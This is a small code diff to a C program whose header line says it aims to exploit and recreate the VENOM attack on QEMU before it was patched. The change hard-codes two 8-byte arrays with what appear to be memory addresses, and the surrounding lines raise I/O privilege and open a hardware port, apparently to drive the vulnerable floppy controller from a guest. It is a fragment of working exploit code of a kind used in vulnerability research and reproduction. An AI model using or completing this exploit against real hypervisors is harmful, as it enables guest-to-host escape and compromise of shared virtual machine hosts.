@@ -12,8 +12,8 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define WRITE 0x05
 
 int main(void){
-        char ctx[8] = {};
-        char cb[8] = {};
+        char ctx[8] = {0x00,0x9c,0x88,0x0e,0x57,0x7f,0x00,0x00};
+        char cb[8] =  {0x90,0x33,0x5f,0x0c,0x57,0x7f,0x00,0x00};
         iopl(3);
         ioperm(FIFO, 1, 1);
 	// printf("write spc_command to port\n");
